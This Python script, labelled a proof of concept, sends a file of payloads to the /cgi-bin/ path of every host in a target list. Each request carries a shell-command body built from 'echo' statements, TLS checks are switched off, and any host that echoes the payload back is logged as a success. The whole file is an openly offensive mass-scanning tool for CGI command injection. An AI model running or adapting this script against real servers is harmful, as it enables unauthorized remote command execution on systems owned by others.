import requests
import sys
import os

# Function to send a request and log the result
def send_payload(host, payload, report):
    url = f"{host}/cgi-bin/{payload}"
    
    # Send the request using the payload
    try:
        response = requests.post(url, data=f"echo Content-Type: text/plain; echo; {payload}", verify=False)
        
        # Log the response status and content if the payload works
        if response.status_code == 200 and payload in response.text:
            print(f"[SUCCESS] Payload: {payload} worked on {host}")
            report.write(f"[SUCCESS] Payload: {payload} worked on {host}\n")
        else:
            print(f"[FAILED] Payload: {payload} failed on {host}")
            report.write(f"[FAILED] Payload: {payload} failed on {host}\n")
    
    except Exception as e:
        print(f"[ERROR] Error sending payload: {payload} to {host}: {str(e)}")
        report.write(f"[ERROR] Error sending payload: {payload} to {host}: {str(e)}\n")

# Function to read hosts and payloads from files
def fuzz_targets(target_file, payload_file, report_file):
    if not os.path.isfile(target_file):
        print(f"Target file {target_file} does not exist.")
        return

    if not os.path.isfile(payload_file):
        print(f"Payload file {payload_file} does not exist.")
        return

    # Open report file to write results
    with open(report_file, 'w') as report:
        # Read targets from file
        with open(target_file, 'r') as targets:
            for host in targets:
                host = host.strip()
                if not host:
                    continue
                print(f"\nTesting host: {host}")
                report.write(f"\nTesting host: {host}\n")

                # Read payloads from file
                with open(payload_file, 'r') as payloads:
                    for payload in payloads:
                        payload = payload.strip()
                        if not payload:
                            continue
                        send_payload(host, payload, report)

        print(f"\nFuzzing complete! Results saved to {report_file}")
        report.write("\nFuzzing complete!\n")


if __name__ == "__main__":
    # Ensure correct number of arguments
    if len(sys.argv) != 4:
        print("Usage: python PoC.py <target_file> <payload_file> <report_file>")
        sys.exit(1)

    # Assign arguments
    target_file = sys.argv[1]
    payload_file = sys.argv[2]
    report_file = sys.argv[3]

    # Run the fuzzing process
    fuzz_targets(target_file, payload_file, report_file)